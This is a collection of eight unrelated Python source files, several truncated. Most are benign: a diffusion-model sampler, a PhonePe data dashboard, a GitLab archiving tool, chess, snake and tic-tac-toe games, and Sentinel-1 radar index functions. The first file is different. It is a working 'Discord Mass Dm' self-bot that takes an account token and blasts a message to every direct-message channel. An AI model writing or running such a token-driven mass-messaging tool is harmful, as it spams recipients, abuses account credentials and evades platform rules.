    "from Config.Util import *\nfrom Config.Config import *\nimport requests\nimport threading\nfrom colorama import Fore\nTitle(\"Discord Mass Dm\")\n\ndef MassDM(token_discord, channels, Message):\n    for channel in channels:\n        for user in [x[\"username\"]+\"#\"+x[\"discriminator\"] for x in channel[\"recipients\"]]:\n            try:\n                requests.post(f\"https://discord.com/api/v9/channels/{channel['id']}/messages\", headers={'Authorization': token_discord}, data={\"content\": f\"{Message}\"})\n                print(f'{color.RED}[+] | Message Send | User: \\\"{color.WHITE}{user}{color.RED}\\\"')\n                Title(f\"Discord Mass Dm - {user}\")\n            except Exception as e:\n                print(f'{color.RED}[X] | Message not Send | Error: \\\"{color.WHITE}{e}{color.RED}\\\"')\n\ntoken_discord = input(f\"{color.RED}\\n[?] | Token -> {color.RESET}\")\nvalidityTest = requests.get('https://discordapp.com/api/v6/users/@me', headers={'Authorization': token_discord, 'Content-Type': 'application/json'})\nif validityTest.status_code != 200:\n    ErrorToken()\ntry:\n message = str(input(f\"{color.RED}[?] | Message -> {color.RESET}\"))\nexcept:\n    ()\nprocesses = []\n\nchannelIds = requests.get(\"https://discord.com/api/v9/users/@me/channels\", headers={'Authorization': token_discord}).json()\nif not channelIds:\n    ()\nfor channel in [channelIds[i:i+3] for i in range(0, len(channelIds), 3)]:\n    t = threading.Thread(target=MassDM, args=(token_discord, channel, message))\n    t.start()\n    processes.append(t)\nfor process in processes:\n    process.join()\nTitle(\"Discord Mass Dm - Finish\")\nprint(f\"{color.RED}[!] | Finish.\")\nContinue()\nReset()",
    "import os\nimport torch\nimport argparse\nfrom math import ceil\n\nfrom unet import Unet\nfrom diffusion import GaussianDiffusion\nfrom utils import get_named_beta_schedule\nfrom embedding import ConditionalEmbedding\n\nfrom torch.nn.parallel import DistributedDataParallel as DDP\nfrom torch.distributed import get_rank, init_process_group, destroy_process_group, all_gather, get_world_size\nfrom torchvision import transforms\nfrom torchvision.utils import save_image\n\n@torch.no_grad()\ndef sample(params:argparse.Namespace):\n    \"\"\"\n    Function to generate samples using a trained model.\n    \"\"\"\n    assert params.genbatch % (torch.cuda.device_count() * params.clsnum) == 0 , 'please re-set your genbatch!!!'\n    # initialize settings\n    init_process_group(backend=\"nccl\")\n    # get local rank for each process\n    local_rank = get_rank()\n    # set device\n    device = torch.device(\"cuda\", local_rank)\n    # load models\n    hyperparams_model = {}\n    with open(os.path.join(params.path, 'params.txt'), 'r') as f:\n        for line in f.readlines():\n            key, val = line.split(':')\n            hyperparams_model[key] = val[:-1]\n    \n    net = Unet(\n                in_ch = int(hyperparams_model[\"inch\"]),\n                mod_ch = int(hyperparams_model[\"modch\"]),\n                out_ch = int(hyperparams_model[\"outch\"]),\n                ch_mul = [ int(i)  for i in hyperparams_model[\"chmul\"][2:-1].split(\",\")],\n                num_res_blocks = int(hyperparams_model[\"numres\"]),\n                cdim = int(hyperparams_model[\"cdim\"]),\n                use_conv= True if hyperparams_model[\"useconv\"] == ' True' else False,\n                droprate = float(hyperparams_model[\"droprate\"]),\n                dtype=torch.float32\n            ).to(device)\n    print(\"model is created\")\n    \n    checkpoint = torch.load(os.path.join(params.path, f'checkpoints/ckpt_{params.epoch}_checkpoint.pt'), map_location='cpu')\n    net.load_state_dict(checkpoint['net'])\n    cemblayer = ConditionalEmbedding(params.clsnum, int(hyperparams_model[\"cdim\"]), int(hyperparams_model[\"cdim\"])).to(device)\n    cemblayer.load_state_dict(checkpoint['cemblayer'])\n    # settings for diffusion model\n    betas = get_named_beta_schedule(num_diffusion_timesteps = int(hyperparams_model[\"T\"]))\n    diffusion = GaussianDiffusion(\n                    dtype = torch.float32,\n                    model = net,\n                    betas = betas,\n                    w = float(hyperparams_model[\"w\"]),\n                    v =  float(hyperparams_model[\"v\"]),\n                    device = device\n                )\n    # DDP settings \n    diffusion.model = DDP(\n                            diffusion.model,\n                            device_ids = [local_rank],\n                            output_device = local_rank\n                        )\n    cemblayer = DDP(\n                    cemblayer,\n                    device_ids = [local_rank],\n                    output_device = local_rank\n                )\n    # eval mode\n    print(hyperparams_model[\"dataset\"].replace(' ','') == 'stl10')\n    diffusion.model.eval()\n    cemblayer.eval()\n    cnt = torch.cuda.device_count()\n    if params.fid:\n        numloop = ceil(params.genum  / params.genbatch)\n    else:\n        numloop = 1\n    each_device_batch = params.genbatch // cnt\n    # label settings\n    if params.label == 'range':\n        lab = torch.ones(params.clsnum, each_device_batch // params.clsnum).type(torch.long) \\\n            * torch.arange(start = 0, end = params.clsnum).reshape(-1,1)\n        lab = lab.reshape(-1, 1).squeeze()\n        lab = lab.to(device)\n    else:\n        lab = torch.randint(low = 0, high = params.clsnum, size = (each_device_batch,), device=device)\n\n    cemb = cemblayer(lab)\n    genshape = (each_device_batch, 3, int(hyperparams_model[\"image_size\"]), int(hyperparams_model[\"image_size\"]))\n    all_samples = []\n    if local_rank == 0:\n        print(numloop)\n    for _ in range(numloop):\n        if params.ddim:\n            generated = diffusion.ddim_sample(genshape, params.num_steps, float(hyperparams_model[\"eta\"]), hyperparams_model[\"select\"][1:], cemb = cemb)\n        else:\n            generated = diffusion.sample(genshape, cemb = cemb)\n        img = generated\n        img = img.reshape(params.clsnum, each_device_batch // params.clsnum, 3, int(hyperparams_model[\"image_size\"]), int(hyperparams_model[\"image_size\"])).contiguous()\n        gathered_samples = [torch.zeros_like(img) for _ in range(get_world_size())]\n        all_gather(gathered_samples, img)\n        all_samples.extend([img.cpu() for img in gathered_samples])\n    samples = torch.concat(all_samples, dim = 1).reshape(params.genbatch * numloop, 3, int(hyperparams_model[\"image_size\"]), int(hyperparams_model[\"image_size\"]))\n    \n    invTrans = transforms.Compose([ transforms.Normalize(mean = [ 0., 0., 0. ],\n                                                     std = [ 1/0.2471, 1/0.2435, 1/0.2616 ]),\n                                transforms.Normalize(mean = [ -0.4914, -0.4822, -0.4465 ],\n       ",
    "#Importing necessary libraries\r\n\r\nimport os\r\nimport git\r\nimport pandas as pd\r\nimport json\r\nimport mysql.connector as sql\r\nimport sqlalchemy\r\nfrom sqlalchemy import create_engine\r\nimport pymysql\r\nimport plotly.express as px\r\nimport streamlit as st\r\nfrom streamlit_option_menu import option_menu\r\n\r\n#Setting up the page\r\n\r\nst.set_page_config(page_title= \"Phonepe Pulse Data Visualization and Exploration | By Surabhi Yadav\",\r\n                   page_icon= \":\ud83d\udcb5:\", \r\n                   layout= \"wide\",\r\n                   initial_sidebar_state= \"expanded\",\r\n                   menu_items={'About': \"\"\"# This app is created by *Surabhi Yadav!*\"\"\"})\r\n\r\nwith st.sidebar:\r\n    selected = option_menu('MENU', [\"Map View\", \"Data Analysis\", \"Interactive Dashboard\"], \r\n                           icons=[\"map-fill\", \"bar-chart-line-fill\", \"clipboard2-pulse-fill\"], \r\n                           menu_icon=\"menu-up\",\r\n                           default_index=0,\r\n                           orientation=\"vertical\",\r\n                           styles={\"nav-link\": {\"font-size\": \"15px\", \"text-align\": \"centre\", \"margin\": \"0px\", \r\n                                                \"--hover-color\": \"#6739B7\"},\r\n                                   \"icon\": {\"font-size\": \"15px\"},\r\n                                   \"container\" : {\"max-width\": \"6000px\"},\r\n                                   \"nav-link-selected\": {\"background-color\": \"#6739B7\"}})\r\n    \r\n#Cloning the repository\r\n\r\nrepo_url = 'https://github.com/PhonePe/pulse.git'\r\nlocal_dir = r'C:\\Users\\sy090\\Downloads\\PROJECTS\\phonepe_pulse_data_visualization_and_exploration\\pulse'\r\nif not os.path.exists(local_dir):\r\n    git.Repo.clone_from(repo_url, local_dir)\r\n\r\n#Creating a key value pair for state names\r\nstate_dict = {\"andaman-&-nicobar-islands\": \"Andaman & Nicobar\", \"andhra-pradesh\": \"Andhra Pradesh\",\r\n              \"arunachal-pradesh\": \"Arunachal Pradesh\", \"assam\": \"Assam\", \"bihar\": \"Bihar\", \"chandigarh\": \"Chandigarh\",\r\n              \"chhattisgarh\": \"Chhattisgarh\", \"dadra-&-nagar-haveli-&-daman-&-diu\": \"Dadra and Nagar Haveli and Daman and Diu\",\r\n              \"delhi\": \"Delhi\", \"goa\": \"Goa\", \"gujarat\": \"Gujarat\", \"haryana\": \"Haryana\", \"himachal-pradesh\": \"Himachal Pradesh\",\r\n              \"jammu-&-kashmir\": \"Jammu & Kashmir\", \"jharkhand\": \"Jharkhand\", \"karnataka\": \"Karnataka\", \"kerala\": \"Kerala\", \r\n              \"ladakh\": \"Ladakh\", \"lakshadweep\": \"Lakshadweep\", \"madhya-pradesh\": \"Madhya Pradesh\", \"maharashtra\": \"Maharashtra\",\r\n              \"manipur\": \"Manipur\", \"meghalaya\": \"Meghalaya\", \"mizoram\": \"Mizoram\", \"nagaland\": \"Nagaland\", \"odisha\": \"Odisha\",\r\n              \"puducherry\": \"Puducherry\", \"punjab\": \"Punjab\", \"rajasthan\": \"Rajasthan\", \"sikkim\": \"Sikkim\", \"tamil-nadu\": \"Tamil Nadu\",\r\n              \"telangana\": \"Telangana\", \"tripura\": \"Tripura\" , \"uttar-pradesh\": \"Uttar Pradesh\", \"uttarakhand\": \"Uttarakhand\",\r\n              \"west-bengal\": \"West Bengal\"}\r\n\r\n#Reading the data and transforming it into suitable format\r\n\r\n#Aggregated transaction\r\npath_agg_trans = f\"{local_dir}/data/aggregated/transaction/country/india/state/\"\r\nagg_state_list=os.listdir(path_agg_trans)\r\n\r\nagg_trans={'State':[], 'Year':[],'Quarter':[],'Transaction_type':[], 'Transaction_count':[], 'Transaction_amount':[]}\r\n\r\nfor i in agg_state_list:\r\n    p_i=path_agg_trans+i+\"/\"\r\n    agg_yr=os.listdir(p_i)\r\n    for j in agg_yr:\r\n        p_j=p_i+j+\"/\"\r\n        agg_yr_list=os.listdir(p_j)\r\n        for k in agg_yr_list:\r\n            p_k=p_j+k\r\n            data=open(p_k,'r')\r\n            D=json.load(data)\r\n            for z in D['data']['transactionData']:\r\n              Name=z['name']\r\n              count=z['paymentInstruments'][0]['count']\r\n              amount=z['paymentInstruments'][0]['amount']\r\n              agg_trans['Transaction_type'].append(Name)\r\n              agg_trans['Transaction_count'].append(count)\r\n              agg_trans['Transaction_amount'].append(amount)\r\n              agg_trans['State'].append(state_dict[i])\r\n              agg_trans['Year'].append(j)\r\n              agg_trans['Quarter'].append(int(k.strip('.json')))\r\n\r\nagg_trans=pd.DataFrame(agg_trans)\r\n# print(agg_trans)\r\n# print(agg_trans.dtypes)\r\n\r\n#Aggregated user\r\npath_agg_user = f\"{local_dir}/data/aggregated/user/country/india/state/\"\r\nagg_state_list=os.listdir(path_agg_user)\r\n\r\nagg_user={'State':[], 'Year':[],'Quarter':[],'Registered_users':[], 'App_opens':[]}\r\n\r\nfor i in agg_state_list:\r\n    p_i=path_agg_user+i+\"/\"\r\n    agg_yr=os.listdir(p_i)\r\n    for j in agg_yr:\r\n        p_j=p_i+j+\"/\"\r\n        agg_yr_list=os.listdir(p_j)\r\n        for k in agg_yr_list:\r\n            p_k=p_j+k\r\n            data=open(p_k,'r')\r\n            D=json.load(data)\r\n            registered_users=D['data']['aggregated']['registeredUsers']\r\n            app_opens=D['data']['aggregated']['appOpens']\r\n            agg_user['Registered_users'].append(registered_users)\r\n            agg_user['App_opens'].append(app_opens)\r\n            agg_user['State'].append(state_dict[i])\r\n            agg_user['Y",
    "import os\nimport subprocess\nfrom datetime import datetime\nfrom enum import Enum\n\nimport gitlab\nimport prompt_toolkit.shortcuts\nfrom dotenv import load_dotenv\nimport questionary\nfrom gitlab.v4.objects import Project\nfrom dateutil import parser\nfrom git import Repo\nfrom tempfile import TemporaryDirectory\n\nload_dotenv()\n\n\nclass ArchiveMode(Enum):\n    SINGLE_REPO = 1\n    DOWNLOAD_AND_DELETE = 2\n    DELETE = 3\n\n    def __str__(self):\n        if self == ArchiveMode.SINGLE_REPO:\n            return \"Archive into single repo\"\n        elif self == ArchiveMode.DOWNLOAD_AND_DELETE:\n            return \"Download archives and delete\"\n        elif self == ArchiveMode.DELETE:\n            return \"Delete without saving\"\n\n    @staticmethod\n    def from_str(mode: str) -> \"ArchiveMode\":\n        for enum in ArchiveMode:\n            if str(enum) == mode:\n                return enum\n        raise ValueError(f\"Invalid mode: {mode}\")\n\n\ndef main():\n    gl = gitlab.Gitlab(url=os.environ.get(\"GITLAB_SERVER\"),\n                       private_token=os.environ.get(\"GITLAB_TOKEN\"))\n    gl.auth()\n    user = gl.user\n    project_limit = user.projects_limit\n    projects: list[Project] = gl.projects.list(get_all=True, owned=True,\n                                               order_by=\"last_activity_at\")\n    project_descriptors = {\n        f\"{project.name_with_namespace} (Last activity {parser.parse(project.last_activity_at).strftime(\"%m/%d/%Y, %H:%M\")})\": project\n        for project in projects}\n    project_count = len(projects)\n    remaining_projects = project_limit - project_count\n    if remaining_projects <= 0:\n        questionary.print(\n            f\"You have reached the project limit of {project_limit} projects. \"\n            f\"You will need to delete one or more projects manually to use \"\n            f\"the 'Archive into single repo' mode.\",\n            style=\"bold fg:red\")\n    elif remaining_projects <= 5:\n        questionary.print(\n            f\"You have {remaining_projects} projects left before reaching the \"\n            f\"project limit of {project_limit}.\",\n            style=\"bold fg:yellow\")\n    else:\n        questionary.print(\n            f\"You have {remaining_projects} projects left before reaching the \"\n            f\"project limit of {project_limit}.\",\n            style=\"bold fg:green\")\n    questionary.press_any_key_to_continue().ask()\n    projects_to_archive = questionary.checkbox(\n        \"Select projects to archive\", choices=project_descriptors).ask()\n    archival_mode = questionary.select(\n        \"Select archival mode\",\n        choices=[str(mode) for mode in ArchiveMode]).ask()\n    archival_mode_enum = ArchiveMode.from_str(archival_mode)\n    if archival_mode_enum == ArchiveMode.SINGLE_REPO:\n        ssh_or_https = questionary.select(\n            \"Select protocol for cloning\",\n            choices=[\"SSH\", \"HTTPS\"], default=\"SSH\").ask()\n        if ssh_or_https == \"SSH\":\n            # Verify that the user has set up SSH keys\n            ssh_proc = subprocess.run(\n                [\"ssh\", \"-T\", \"git@gitlab.cecs.anu.edu.au\"],\n                capture_output=True)\n            if ssh_proc.returncode != 0:\n                questionary.print(\"You need to set up SSH keys before using \"\n                                  \"this mode.\",\n                                  style=\"bold fg:red\")\n                return\n            else:\n                questionary.print(\"SSH keys are set up already!\",\n                                  style=\"bold fg:green\")\n        else:\n            # Verify that the user has set up HTTPS credentials\n            # idk how to do this so get rekt if you use HTTPS\n            questionary.print(\n                \"You may get prompted for your GitLab username and password.\",\n                style=\"bold fg:yellow\")\n        tmp_dir = TemporaryDirectory(\"_gitlab-archive\")\n        questionary.print(f\"Created temporary directory {tmp_dir.name}\",\n                          style=\"italic fg:green\")\n        main_repo = Repo.init(tmp_dir.name)\n        questionary.print(f\"Initialized main repository in {tmp_dir.name}\",\n                          style=\"italic fg:green\")\n        upstream_project_id = f\"project-archive-{datetime.now().strftime(\n            '%Y-%m-%d-%H-%M-%S')}\"\n        upstream_project = gl.projects.create({'name': upstream_project_id})\n        questionary.print(f\"Created upstream project {upstream_project_id}\",\n                          style=\"italic fg:green\")\n        main_repo.create_remote(\"origin\", upstream_project.ssh_url_to_repo\n        if ssh_or_https == \"SSH\"\n        else upstream_project.http_url_to_repo)\n        for project_descriptor in projects_to_archive:\n            project = project_descriptors[project_descriptor]\n            project_id = str(project.id)\n            project_remote = main_repo.create_remote(project_id,\n                                                     project.ssh_url_to_repo\n                                                     if ssh_or_https == \"SSH\"\n                                   ",
    "import pygame, os\nfrom pygame.locals import *\n\npygame.init()\nclock = pygame.time.Clock()\n\nPATH = os.path.dirname(__file__)+'/'\nFPS = 60\nSCREEN_W = 700\nSCREEN_H = 700\nscreen = pygame.display.set_mode((SCREEN_W,SCREEN_H))\npygame.display.set_caption(\"Chess\")\nHOR = ('a','b','c','d','e','f','g','h')\nVER = tuple([i for i in range(8,0,-1)])\n\nclass Board:\n    def __init__(self, size, pos):\n        self.size = size\n        self.pos = pos\n        self.border = pygame.rect.Rect(*pos,*[size]*2)\n        self.board = {}\n\n        self.create()\n\n    def create(self):\n        x,y = self.pos\n        box_size = self.size//8\n        colors = ((245, 204, 160),(101, 69, 31))\n        colors = ((203,207,174),(89,123,54))\n        n=0\n        for i in range(8):\n            n=1-n\n            for j in range(8):\n                n=1-n\n                box = pygame.rect.Rect(x+i*box_size,y+j*box_size,*[box_size]*2)\n                self.board[(HOR[i],VER[j])] = (box,colors[n])\n    \n    def revolve(self):\n        for key in self.board:\n            value = self.board[key]\n            value[0].right = self.size+self.pos[0]*2-value[0].x\n            value[0].bottom = self.size+self.pos[1]*2-value[0].y\n\n    def display(self):\n        pygame.draw.rect(screen, (100,100,100), self.border,1,5)\n        for x in self.board:\n            pygame.draw.rect(screen,self.board[x][1],self.board[x][0])\n            border = pygame.Rect(0,0,*[self.size//8]*2)\n            border.center = self.board[x][0].center\n            # pygame.draw.rect(screen, (100,60,50), border, 1)\n\n\nclass Moves:\n    def __init__(self):\n        self.castling = [1,1]\n        self.moves = []\n\n    def rook(self,hor,ver):\n        spaces=[[],[],[],[]]\n        for i in HOR[HOR.index(hor)+1:]:\n            if hor<'h':\n                spaces[0].append((i,ver))\n        for i in HOR[HOR.index(hor)-1::-1]:\n            if hor>'a':\n                spaces[1].append((i,ver))\n        for i in VER[VER.index(ver)+1:]:\n            if ver>1:\n                spaces[2].append((hor,i))\n        for i in VER[VER.index(ver)-1::-1]:\n            if ver<8:\n                spaces[3].append((hor,i))\n        return spaces\n    \n    def knight(self,hor,ver):\n        spaces = []\n        if hor>'b':\n            x = HOR[HOR.index(hor)-2]\n            if ver>1:\n                spaces.append((x,ver-1))\n            if ver<8:\n                spaces.append((x,ver+1))\n        if hor<'g':\n            x = HOR[HOR.index(hor)+2]\n            if ver>1:\n                spaces.append((x,ver-1))\n            if ver<8:\n                spaces.append((x,ver+1))\n        if ver>2:\n            x = HOR.index(hor)\n            y = VER[VER.index(ver)+2]\n            if hor>'a':\n                spaces.append((HOR[x-1],y))\n            if hor<'h':\n                spaces.append((HOR[x+1],y))\n        if ver<7:\n            x = HOR.index(hor)\n            y = VER[VER.index(ver)-2]\n            if hor>'a':\n                spaces.append((HOR[x-1],y))\n            if hor<'h':\n                spaces.append((HOR[x+1],y))\n        return spaces\n    \n    def bishop(self,hor,ver):\n        spaces=[[],[],[],[]]\n        i=0\n        for x in (HOR[HOR.index(hor)+1:],HOR[HOR.index(hor)-1::-1]):\n            for y in (VER[VER.index(ver)+1:],VER[VER.index(ver)-1::-1]):\n                n = min(len(x),len(y))\n                if ((x==HOR[HOR.index(hor)+1:] and hor<'h') or (x==HOR[HOR.index(hor)-1::-1] and hor>'a')) and ((y==VER[VER.index(ver)+1:] and ver>1) or (y==VER[VER.index(ver)-1::-1] and ver<8)):\n                    for j in range(n):\n                        spaces[i].append((x[j],y[j]))\n                i+=1\n        return spaces\n\n    def king(self,hor:str,ver:int,player:dict,white:dict):\n        spaces = []\n        special = []\n        side = []\n        x = HOR.index(hor)\n        def repeat(t):\n            if ver>1:\n                spaces.append((t,ver-1))\n            if ver<8:\n                spaces.append((t,ver+1))\n        if hor>'a':\n            spaces.append((HOR[x-1],ver))\n            repeat(HOR[x-1])\n        if hor<'h':\n            spaces.append((HOR[x+1],ver))\n            repeat(HOR[x+1])\n        repeat(hor)\n\n        def repeat2(ver):\n            for x in player:\n                if player[x][1]==ver:\n                    if player[x][0] in ('b','c','d'):\n                        break\n            else:\n                special.extend([(i,ver) for i in ('a','b','c')])\n                side.append('a')\n            for x in player:\n                if player[x][1]==ver:\n                    if player[x][0] in ('f','g'):\n                        break\n            else:\n                special.extend([(i,ver) for i in ('g','h')])\n                side.append('h')\n            \n\n        if player==white and self.castling[0]:\n            repeat2(1)\n        elif self.castling[1]:\n            repeat2(8)\n        return spaces, special, side\n    \n    def pawns(self,hor:str,ver:int,player:dict,opponent:dict,white:dict):\n        x = HOR.index(hor)\n        def repeat(i, bonus=None):\n        ",
    "import pygame\n\npygame.init()\n\nFPS = 8\nWIDTH = 1280\nHEIGHT = 720\nTITLE = \"Snake\"\nTILE_SIZE = 40\nBACKGROUND_COLORS = [(20, 240, 20), (20, 200, 20)]\nSNAKE_COLOR = (0, 0, 255)\nAPPLE_COLOR = (200, 20, 20)\n\nclass Snake:\n    def __init__(self) -> None:\n        self.reset()\n    \n    def reset(self) -> None:\n        self.body = [(1, 1), (2, 1), (3, 1)]\n        self.direction = (1, 0)\n\n    def change_direction(self, direction) -> None:\n        if direction == \"UP\" and self.direction != (0, 1):\n            self.direction = (0, -1)\n        elif direction == \"DOWN\" and self.direction != (0, -1):\n            self.direction = (0, 1)\n        elif direction == \"LEFT\" and self.direction != (1, 0):\n            self.direction = (-1, 0)\n        elif direction == \"RIGHT\" and self.direction != (-1, 0):\n            self.direction = (1, 0)\n\n    def move(self) -> None:\n        head = self.body[-1]\n        new_head = (head[0] + self.direction[0], head[1] + self.direction[1])\n        self.body.pop(0)\n        self.body.append(new_head)\n\n    def grow(self) -> None:\n        head = self.body[-1]\n        new_head = (head[0] + self.direction[0], head[1] + self.direction[1])\n        self.body.append(new_head)\n    \n    def check_collision(self) -> bool:\n        head = self.body[-1]\n        for x, y in self.body[:-1]:\n            if head == (x, y):\n                return True\n\n        return False\n\n    def check_boundaries(self) -> bool:\n        head = self.body[-1]\n        if head[0] < 0 or head[0] >= WIDTH // TILE_SIZE or head[1] < 0 or head[1] >= HEIGHT // TILE_SIZE:\n            return True\n\n        return False\n\n    def check_apple(self, apple) -> bool:\n        head = self.body[-1]\n        return head == apple.position\n\n    def get_score(self) -> int:\n        return len(self.body) - 3\n\n    def draw(self, screen) -> None:\n        for i, (x, y) in enumerate(self.body):\n            color = tuple(map(lambda x: x * i // len(self.body), SNAKE_COLOR))\n            pygame.draw.rect(screen, color, (x * TILE_SIZE + TILE_SIZE // 4, y * TILE_SIZE + TILE_SIZE // 4, TILE_SIZE // 2, TILE_SIZE // 2))\n\nclass Apple:\n    def __init__(self):\n        self.reset()\n\n    def reset(self):\n        self.position = (pygame.time.get_ticks() % (WIDTH // TILE_SIZE), pygame.time.get_ticks() % (HEIGHT // TILE_SIZE))\n\n    def draw(self, screen):\n        pygame.draw.circle(screen, APPLE_COLOR, (self.position[0] * TILE_SIZE + TILE_SIZE // 2, self.position[1] * TILE_SIZE + TILE_SIZE // 2), TILE_SIZE // 2)\n\nsnake = Snake()\napple = Apple()\n\npygame.display.set_caption(TITLE)\nscreen = pygame.display.set_mode([1280, 720], pygame.RESIZABLE, 32, 0, 0)\ngame_over = False\ntotalDelta = 0\n\nrunning = True\nwhile running:\n    start = pygame.time.get_ticks()\n\n    for event in pygame.event.get():\n        if event.type == pygame.QUIT:\n            running = False\n\n    keys = pygame.key.get_pressed()\n    if keys[pygame.K_UP]:\n        snake.change_direction(\"UP\")\n    elif keys[pygame.K_DOWN]:\n        snake.change_direction(\"DOWN\")\n    elif keys[pygame.K_LEFT]:\n        snake.change_direction(\"LEFT\")\n    elif keys[pygame.K_RIGHT]:\n        snake.change_direction(\"RIGHT\")\n    elif game_over:\n        continue\n\n    game_over = False\n    end = pygame.time.get_ticks()\n    delta = end - start\n    if totalDelta + delta < 1000 / FPS:\n        totalDelta += delta\n        continue\n\n    totalDelta = 0\n\n    snake.move()\n    if snake.check_collision() or snake.check_boundaries():\n        score = snake.get_score()\n        snake.reset()\n\n        font = pygame.font.Font(None, 74)\n        text = font.render(f\"Game Over! Score: {score}\", True, (255, 255, 255))\n        text_rect = text.get_rect(center=(WIDTH // 2, HEIGHT // 2))\n        screen.blit(text, text_rect)\n        pygame.display.flip()\n        game_over = True\n        continue\n\n    if snake.check_apple(apple):\n        snake.grow()\n        apple.reset()\n\n    screen.fill((0, 0, 0))\n    for x in range(0, WIDTH, TILE_SIZE):\n        for y in range(0, HEIGHT, TILE_SIZE):\n            color = BACKGROUND_COLORS[(x + y) // TILE_SIZE % 2]\n            pygame.draw.rect(screen, color, (x, y, TILE_SIZE, TILE_SIZE))\n\n    apple.draw(screen)\n    snake.draw(screen)\n\n    pygame.display.flip()\n\npygame.quit()\n",
    "import ee, pandas as pd\n\n\ndef get_all_polarizations(image, date, polygon):\n    '''\n    Calculate all the mean polarization values for a specific date and polygon in a Sentinel-1 image collection.\n\n    Sentinel-1 is a satellite mission from the European Space Agency (ESA) that carries a Synthetic Aperture Radar (SAR) instrument. \n    The SAR system is capable of transmitting and receiving radar signals in different polarizations, which refers to the orientation \n    of the electromagnetic waves as they travel through space.\n\n    The Sentinel-1 SAR instrument can transmit and receive signals in two different polarization modes:\n    - VV (vertical transmit, vertical receive): useful for detecting the roughness of surfaces, such as ocean waves or ice, as the radar \n      signal is more strongly scattered in the vertical direction.\n    - VH (vertical transmit, horizontal receive): particularly useful for identifying targets with vertical structures, such as trees \n      and buildings, as it produces strong backscatter signals.\n\n    Args:\n        image (ee.ImageCollection): The Sentinel-1 image collection filtered by date and bounds.\n        date (pd.Timestamp): The acquisition date in Pandas Timestamp format.\n        polygon (ee.Geometry): The field polygon geometry in Earth Engine format.\n    \n    Returns:\n        polarizations_means (dictionary): a dictionary containing for each polarization the mean value, for the specified date and polygon.\n    '''\n    # Filter image collection to get the image for the date\n    image = ee.Image(image.filterDate(date.strftime('%Y-%m-%d'), (date + pd.Timedelta(days=1)).strftime('%Y-%m-%d')).first())\n\n    # Calculate the mean value over the area for the specified polarization type\n    polarizations_list = ['VV', 'VH']\n    polarizations_means = {}\n    for polarization in polarizations_list:\n        polarizations_means[polarization] = image.reduceRegion(reducer=ee.Reducer.mean(), geometry=polygon).getInfo()[polarization]\n    return polarizations_means\n\n\ndef calculate_radar_vegetation_index(polarizations_means):\n    '''\n    Calculate the Radar Vegetation Index (RVI) for a specific date and polygon in a Sentinel-1 image collection.\n    \n    Subhadip Dey: 'Vegetation indices are extremely helpful in understanding the agricultural crop conditions and\n    their mapping. In optical remote sensing, Normalized Difference Vegetation Index (NDVI) is one\n    such index which conveys such crop health condition within a scene. However, the limitation of\n    optical remote sensing is the inability to penetrate cloud cover due to which ground data\n    acquisition becomes limited within a crop growth season. Hence, a temporal gap in the acquired\n    data might affect crop monitoring as well as crop mapping. On the contrary, Synthetic Aperture\n    Radar (SAR) can penetrate the cloud cover, which provides the advantage of acquiring ground data\n    during cloudy climatic conditions. Hence, the use of SAR data might be an appealing alternative to\n    monitor crop conditions, especially during the monsoon season.'\n    Formula source: https://github.com/sentinel-hub/custom-scripts/blob/master/sentinel-1/radar_vegetation_index_code_dual_polarimetric/script.js\n    \n    Args:\n        polarizations_means (dictionary): a dictionary containing for each polarization the mean value, for a specified date and polygon.\n    \n    Returns:\n        float: the mean RVI value, for the specified date and polygon.\n    '''\n    # Returns RVI\n    return (polarizations_means['VH'] * 4.0) / (polarizations_means['VV'] + polarizations_means['VH'])\n\n\ndef calculate_simple_index(polarizations_means, type=''):\n    '''\n    Calculate a simple index (using VH and VV) for a specific date and polygon in a Sentinel-1 image collection.\n\n    The functions are used to perform arithmetic operations on two bands of the data, specifically the VH and VV bands, \n    which represent the vertical and horizontal polarizations of the radar signal, respectively.\n    The functions provide four options for processing the data, depending on the 'type' parameter provided:\n    - AVE: This function computes the average of the VH and VV bands, which can be useful for certain applications \n      such as identifying water bodies, where the radar signal is affected by the surface roughness of the water.\n    - DIF: This function computes the difference between the VH and VV bands, which can be useful for identifying \n      areas with different types of surfaces, such as vegetation and soil.\n    - RAT1: This function computes the ratio of the VV and VH bands, which can be useful for identifying areas \n      with different levels of moisture content, such as wetlands or areas affected by rainfall.\n    - RAT2: This function computes the ratio of the VH and VV bands, which can be useful for identifying areas \n      with different levels of roughness, such as urban areas or forests.\n\n    Overall, these functions provide a flexible and powerful set of tools for proc",
    "import random\n\nboard = [[1,2,3],\n\t\t\t[4,5,6],\n\t\t\t[7,8,9]\n\t\t\t]\n\t\t\t\ndef display_board():\n\t\t\tprint()\n\t\t\tfor sublist in board:\n\t\t\t print(\"+-------+-------+-------+\")\n\t\t\t print(\"|       |       |       |\")\n\t\t\t print(\"|\",end=\"   \")\n\t\t\t for item in sublist:\n\t\t\t \tprint(item, \"  |\",end=\"   \")\n\t\t\t print()\n\t\t\t print(\"|       |       |       |\")\n\t\t\tprint(\"+-------+-------+-------+\")\t\t\t\n\t\t\t\n\n\t\t\t\navailable = [1,2,3,4,5,6,7,8,9]\n\ndef win_checker():\n\tif (board[0][0] == board[0][1] and board[0][2] == board[0][1]) == True:\n\t\treturn True\n\telif (board[1][0] == board[1][1] and board[1][2] == board[1][1]) == True:\n\t\treturn True\n\telif (board[2][0] == board[2][1] and board[2][2] == board[2][1]) == True:\n\t\treturn True\n\telif (board[0][0] == board[1][0] and board[2][0] == board[1][0]) == True:\n\t\treturn True\n\telif (board[0][1] == board[1][1] and board[2][1] == board[0][1]) == True:\n\t\treturn True\n\telif (board[0][2] == board[1][2] and board[0][2] == board[2][2]) == True:\n\t\treturn True\n\telif (board[1][1] == board[0][2] and board[2][0] == board[1][1]) == True:\n\t\treturn True\n\telif (board[1][1] == board[0][0] and board[2][2] == board[1][1]) == True:\n\t\treturn True\n\n\ndef comp_choice():\n\tprint()\n\tprint()\n\tc_choice = random.choice(available)\n\twhile (c_choice>0 and c_choice<10) and (c_choice in available):\n\t\tfor i in range(len(board)):\n\t\t      \t\tfor j in range(len(board[i])):\n\t\t      \t\t\tif board[i][j] == c_choice:\n\t\t      \t\t\t\tboard[i][j] = \"X\"\n\t\t      \t\t\t\tavailable.remove(c_choice)\n\t\t      \t\t\t\tbreak\n\t\t\n\ndef player_choice():\n\tprint()\n\tp_choice = int(input(\"Enter your move: \"))\n\twhile not ((p_choice >0 and p_choice <10) and (p_choice in available)):\n\t\tprint(\"Invalid move try again\")\n\t\tp_choice = int(input(\"Enter your move: \"))\n\telse:\n\t\t\tfor i in range(len(board)):\n\t\t\t\tfor j in range(len(board[i])):\n\t\t\t\t\tif board[i][j] == 